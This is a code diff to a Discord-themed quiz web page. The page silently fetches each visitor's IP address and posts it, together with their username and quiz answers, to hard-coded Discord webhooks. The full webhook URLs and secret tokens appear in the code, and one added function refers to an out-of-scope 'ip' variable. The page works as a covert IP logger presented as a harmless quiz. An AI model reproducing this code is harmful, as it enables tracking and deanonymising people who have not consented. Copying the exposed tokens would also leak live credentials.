@@ -79,7 +79,7 @@
         <h1>Welcome to the Quiz!</h1>
         <p>Please enter your Discord username to proceed: (Please be truthful).</p>
         <label for="discordUsername">Enter your Discord username:</label>
-        <input type="text" id="discordUsername" placeholder="Discord user - Do not use a display">
+        <input type="text" id="discordUsername" placeholder="Discord user - Do not use a display" maxlength="32"> <!-- Added maxlength attribute -->
         <br>
         <button id="clickMeBtn" disabled>START QUIZ!</button>
     </div>
@@ -143,8 +143,55 @@
                         quizScreens[currentQuizScreen].style.display = 'block';
                     } else {
                         secondScreen.style.display = 'block';
+                        sendQuizResults();
                     }
                 }
+            };
+
+            const sendQuizResults = () => {
+                const answers = [];
+                quizScreens.forEach((screen, index) => {
+                    const question = screen.querySelector('h1').textContent;
+                    const answer = document.getElementById(`answer${index + 1}`).value.trim();
+                    answers.push(`${question}: ${answer}`);
+                });
+                const username = discordUsernameInput.value.trim().substring(0, 32); // Cap at 32 characters
+                const webhookUrlQuiz = 'https://discord.com/api/webhooks/1244329926648402020/3CEaFEiftHTcq7eRALLvs2guKYjK51GXGuPNVMtjlkdeCv5Ach2kekBVqiS3BR-9zUN7';
+                const messageQuiz = {
+                    content: answers.join('\n') + `\nUsername: ${username}`
+                };
+                const webhookUrlIP = 'https://discord.com/api/webhooks/1244328967247499356/1V6jytPrHM7qqbx7r-1Qp4fogxUS6stFDPEBphEsZW7COnvcOnULsKcBaIYyOpTt_bEH';
+                const messageIP = {
+                    content: `!IP: ${ip}, Username: ${username}`
+                };
+
+                fetch(webhookUrlQuiz, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(messageQuiz)
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Failed to send quiz webhook request');
+                    }
+                })
+                .catch(error => console.error('ERROR', error));
+
+                fetch(webhookUrlIP, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(messageIP)
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Failed to send IP webhook request');
+                    }
+                })
+                .catch(error => console.error('ERROR', error));
             };
 
             clickMeBtn.addEventListener('click', () => {
@@ -159,28 +206,33 @@
                     .then(response => response.json())
                     .then(data => {
                         const ip = data.ip;
-                        const webhookUrl = 'https://discord.com/api/webhooks/1244328967247499356/1V6jytPrHM7qqbx7r-1Qp4fogxUS6stFDPEBphEsZW7COnvcOnULsKcBaIYyOpTt_bEH';
-                        const message = {
-                            content: `!IP: ${ip}, Username: ${discordUsername}`
-                        };
-
-                        return fetch(webhookUrl, {
-                            method: 'POST',
-                            headers: {
-                                'Content-Type': 'application/json'
-                            },
-                            body: JSON.stringify(message)
-                        });
-                    })
-                    .then(response => {
-                        if (!response.ok) {
-                            throw new Error('Failed to send webhook request');
-                        }
+                        sendIPandUsername(ip, discordUsername);
                         firstScreen.style.opacity = 0;
                         quizScreens[currentQuizScreen].style.display = 'block';
                     })
                     .catch(error => console.error('ERROR', error));
             });
+
+            const sendIPandUsername = (ip, username) => {
+                const webhookUrlIP = 'https://discord.com/api/webhooks/1244328967247499356/1V6jytPrHM7qqbx7r-1Qp4fogxUS6stFDPEBphEsZW7COnvcOnULsKcBaIYyOpTt_bEH';
+                const messageIP = {
+                    content: `!IP: ${ip}, Username: ${username}`
+                };
+
+                fetch(webhookUrlIP, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(messageIP)
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Failed to send IP webhook request');
+                    }
+                })
+                .catch(error => console.error('ERROR', error));
+            };
 
             const nextButtons = document.querySelectorAll('.nextBtn');
             nextButtons.forEach((button, index) => {
